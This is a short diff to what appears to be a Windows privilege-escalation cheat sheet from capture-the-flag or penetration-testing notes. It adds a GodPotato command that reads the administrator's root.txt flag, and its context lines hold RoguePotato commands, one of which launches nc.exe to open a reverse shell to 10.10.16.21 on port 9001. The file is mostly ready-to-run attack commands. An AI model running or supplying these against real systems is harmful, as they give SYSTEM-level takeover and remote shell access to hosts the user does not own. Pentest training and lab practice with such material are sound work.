@@ -340,6 +340,11 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     https://github.com/antonioCoco/RoguePotato
     RoguePotato.exe -r 10.10.16.21 -e "c:\tools\nc.exe 10.10.16.21 9001 -e cmd" -l 9999
     
+# GodPotato
+
+    https://github.com/BeichenDream/GodPotato
+    ./GodPotato-NET4.exe -cmd "cmd /c type c:\users\administrator\desktop\root.txt"
+
 # SeBackupPrivilege
 
 1        делаем файл diskshadow.txt
